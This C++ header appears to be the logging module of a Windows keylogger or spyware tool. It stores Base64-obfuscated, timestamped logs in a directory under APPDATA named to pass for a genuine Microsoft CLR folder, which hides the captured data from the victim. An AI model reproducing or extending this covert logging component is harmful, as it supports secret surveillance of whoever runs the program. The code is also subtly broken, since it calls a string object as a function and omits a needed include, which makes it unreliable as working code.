#pragma once

#include<string>
#include<cstdlib>
#include<fstream>
#include<Windows.h>
#include"Helper.h"
#include"Base64.h"


namespace IO {
	std::string GetOurPath(const bool appendSeparator = false) {
		std::string appdata_dir(getenv("APPDATA"));
		std::string full = appdata_dir + "\\Microsoft\\CLR";

		return full + (appendSeparator ? "\\" : "");
	}

	bool MakeOneDir(std::string path) {
		return (bool)CreateDirectoryA(path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
	}

	bool MakeDir(std::string path) {
		for (char &c : path) {
			if (c == '\\') {
				c = '\0';
				if (!MakeOneDir(path))
					return false;
				c = '\\';
			}
		}
		return true;
	}

	template<typename T>
	std::string WriteLog(const T &t) {
		std::string path = GetOurPath(true);
		HelperFunc::DateTime dt;
		std::string name = dt.GetDateTimeString("_") + ".log";

		try {
			std::ofstream file(path + name);
			if (!file)
				return "";

			std::ostringstream s;
			s << "[" << dt.GetDateTimeString() << "]" <<
				std::endl << t << std::endl;

			std::string data = Base64::EncryptB64(s.str());
			file << data();
			
			if (!file)
				return "";
			file.close();
			return name;
		}

		catch (...) {
			return "";
		}
	}

}
